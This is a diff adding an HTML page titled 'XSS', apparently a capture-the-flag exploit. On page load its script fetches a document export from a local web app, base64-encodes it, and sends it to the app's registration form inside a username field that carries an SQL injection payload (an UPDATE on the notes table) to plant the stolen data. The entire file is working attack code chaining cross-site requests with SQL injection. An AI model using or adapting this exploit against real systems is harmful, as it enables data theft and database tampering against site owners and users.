@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>XSS</title>
+    <script>
+        function url_encode(data) {
+            let enc = '';
+            for (let i = 0; i < data.length; i++) {
+                let num = data[i].charCodeAt(0).toString(16);
+                if (num.length < 2) {
+                    num = '0' + num;
+                }
+                enc += '%' + num;
+            }
+            return enc;
+        }
+
+        function blobToBase64(blob) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.onerror = reject;
+                reader.readAsDataURL(blob);
+            });
+        }
+
+        function executeXSS() {
+            console.log('XSSSS');
+            let latex_id = '1';
+            
+            console.log('xshhh');
+            fetch('http://127.0.0.1:1337/notes/export_latex/' + latex_id + '/', {
+                method: 'GET',
+            })
+            .then(response1 => response1.blob())
+            .then(pdfBlob => blobToBase64(pdfBlob))
+            .then(pdfBase64 => {
+                console.log('PDF Base64:', pdfBase64);
+                
+                let payload = 'a\',\'a\'); UPDATE notes SET note = \''+  url_encode(pdfBase64)  +'\' WHERE id ='+  latex_id  +' -- -';
+
+                return fetch('http://127.0.0.1:1337/register/', {
+                    method: 'POST',
+                    body: 'username=' + payload + '&password=123456',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                });
+            })
+            .then(response2 => {
+                console.log('Payload sent');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        executeXSS();
+    </script>
+</head>
+<body>
+    <h1>XSS</h1>
+</body>
+</html>
